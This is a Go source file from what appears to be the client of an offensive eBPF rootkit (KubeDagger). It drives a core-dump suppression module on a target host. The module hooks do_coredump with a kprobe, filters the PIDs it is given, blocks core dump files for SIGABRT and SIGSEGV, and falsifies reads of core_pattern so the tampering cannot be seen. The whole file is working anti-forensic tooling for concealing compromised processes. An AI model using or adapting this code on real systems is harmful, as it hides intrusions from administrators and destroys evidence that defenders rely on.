package coredump

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type SuppressResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, pids, output string) error {
	result := &SuppressResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_do_coredump",
			"kprobe on do_coredump to intercept core dump generation for target PIDs",
			"coredump_hook",
		},
		{
			"configure_pid_filter",
			"populate BPF hash map with PIDs whose core dumps should be suppressed",
			"coredump_set_pids",
		},
		{
			"suppress_signal_delivery",
			"prevent SIGABRT/SIGSEGV core dump file creation for filtered processes",
			"coredump_suppress_signal",
		},
		{
			"hide_coredump_pattern",
			"modify /proc/sys/kernel/core_pattern reads to hide evidence of suppression",
			"coredump_hide_pattern",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + pids
		status := shared.SendCommand(target, "/coredump_suppress", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
